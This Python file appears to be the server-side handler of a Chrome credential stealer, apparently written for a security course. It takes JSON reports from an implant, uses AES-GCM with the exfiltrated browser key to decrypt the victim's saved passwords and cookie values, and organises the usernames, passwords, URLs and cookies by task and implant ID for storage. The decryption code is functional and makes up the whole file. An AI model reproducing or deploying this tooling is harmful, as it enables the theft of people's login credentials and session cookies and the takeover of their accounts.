from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from ctypes import *
from ctypes.wintypes import DWORD
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import shutil
from datetime import timezone, datetime, timedelta
import json

#taken from sample class code
def decrypt_password(encrypted_password, key):
    try:
        #print(encrypted_password)
        #print(key)
        key = bytes.fromhex(key)
        encrypted_password = bytes.fromhex(encrypted_password)
        #print(key)
        # Parse the IV. This is a constnat used in AES GCM that we will talk about next week!
        # the IV will be in the same place across all machines
        iv = encrypted_password[3:15]
        # the actual ciphertext is the remaining bytes
        ciphertext = encrypted_password[15:]
        # Decrypt the password
        #print(len(key))
        
        cipher = AESGCM(key)
        pt = cipher.decrypt(iv, ciphertext, None).decode()
        #print("CT:", pt)
        #cipher = AES.new(key, AES.MODE_GCM, iv)
        # return cipher.decrypt(ciphertext)[:-16].decode()
        return pt
    except Exception as e:
        print(Exception, e,)
        # if the above fails, it is possible that your browsert is OLD
        # in that case, you can just directly call the DPAPI
       

#will parse the passwords json sent from chrome stealer
def newParseJSON(json_res):

    response_data = json_res.get('response_data')

    key = response_data.get('KEY')
    cookies = response_data.get('COOKIES')
    passwords = response_data.get('PASSWORDS')

    target_implant_id = json_res.get('target_implant_id')
    task_id = json_res['task_id']

    username_list = []
    password_list = []
    url_list = []
    host_key_list = []
    encrypted_value_list = []
    prof_pw_list = []
    prof_cook_list = []

    for user in passwords:
        for entry in passwords[user]:
            password_list.append(decrypt_password(entry['password'], key))
            username_list.append(entry['username'])
            url_list.append(entry['url'])
            prof_pw_list.append(user)
    
    #print(password_list)
    for user in cookies:
        for entry in cookies[user]:
            host_key_list.append(entry['HOST_KEY'])
            encrypted_value_list.append(decrypt_password(entry['encrypted value'], key))
            prof_cook_list.append(user)
    
    values_cookie = []
    for i in range(len(prof_cook_list)):
        values_cookie += [(task_id, target_implant_id, prof_cook_list[i], host_key_list[i], encrypted_value_list[i])]

    values_passwords = []
    for i in range(len(prof_pw_list)):
        values_passwords += [(task_id, target_implant_id, prof_pw_list[i], username_list[i], password_list[i], url_list[i])]
    return values_cookie, values_passwords
            

